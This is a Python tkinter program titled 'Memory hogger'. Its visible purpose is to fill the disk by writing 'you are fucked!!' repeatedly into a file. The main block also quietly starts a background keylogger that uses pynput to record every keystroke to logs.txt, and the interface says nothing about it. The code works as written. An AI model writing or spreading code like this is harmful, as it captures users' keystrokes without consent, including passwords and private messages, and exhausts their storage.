# v 1.1

import tkinter as tk
import threading
from os import path
from pynput.keyboard import Key, Listener
import logging

logging.basicConfig(filename="logs.txt", level=logging.DEBUG, format="%(asctime)s - %(message)s")


cycle = 0  # Variable to store the cycle value entered by the user
words = "you are fucked!!"  # Words to be written in the flood
size = 0  # Variable to store the calculated file size

def floodMultithreading(MBS):
    """
    Function to start the flood in a separate thread.

    Parameters:
    - MBS (int): Number of megabytes to flood (multiplied by 2 for the thread)

    This function creates a new thread and calls the `flood` function
    with the specified number of megabytes.
    """
    thread = threading.Thread(target=flood, args=(MBS*2,))
    thread.start()

def flood(mbs):
    """
    Function to perform the flood by writing the words to a file.

    Parameters:
    - mbs (int): Number of megabytes to flood

    This function writes the specified words to a file repeatedly
    to perform the flood. The file size is calculated and stored in
    the `size` variable.
    """
    global size
    with open("data.txt", "w") as f:
        for i in range(mbs * 1024):
            for x in range(16384):
                f.write(words)
                f.write(words)
                f.write(words)
                f.write(words)
    print("done!")
    size = path.getsize("data.txt")
    size = size / (1024 ** 2)
    varSizeLabel.config(text=size)  # Update the varSizeLabel with the calculated file size

def getUsrCycle(event):
    """
    Function to handle the user input for the cycle value.

    Parameters:
    - event: Event object (unused)

    This function retrieves the cycle value entered by the user,
    updates the `cycle` variable, and triggers the flood when the
    start button is clicked.
    """
    global cycle
    cycle = int(cycle_textbox.get())
    print(cycle)
    cycle_textbox.delete(0, tk.END)
    startBtn.config(command=lambda: flood(cycle))

def on_press(key):
    """
    Function to handle key press events.

    Parameters:
    - key: Key object

    This function logs the pressed key using the `logging` module.
    """
    logging.info(str(key))

def start_key_logging():
    with Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == '__main__':
    window = tk.Tk()
    window.geometry("230x100")
    window.title("Memory hogger")

    # Create a label for the "Gigabytes" text
    megabyteLabel = tk.Label(text="Gigabytes:")
    megabyteLabel.grid(column=1, row=1)

    # Create an entry box for user input
    cycle_textbox = tk.Entry(window, foreground="white", width=10)
    cycle_textbox.grid(column=1, row=2)
    cycle_textbox.bind('<Return>', getUsrCycle)

    # Create a button to start the flood
    startBtn = tk.Button(window, text="Start Flood", command=lambda: floodMultithreading(cycle), height=2)
    startBtn.grid(column=1, row=3)

    # Create a label to display the calculated file size
    showSizeLabel = tk.Label(window, text="True file size (mb):")
    showSizeLabel.grid(column=3, row=1)

    # Create a label to show the actual file size
    varSizeLabel = tk.Label(window, text=size)
    varSizeLabel.grid(column=3, row=2)

    # Create a button to quit the application
    escBtn = tk.Button(window, text="Quit", command=exit)
    escBtn.place(x=100, y=50)

    # Start the keyboard logging
    threading.Thread(target=start_key_logging).start()

    # Start the Tkinter event loop
    window.mainloop()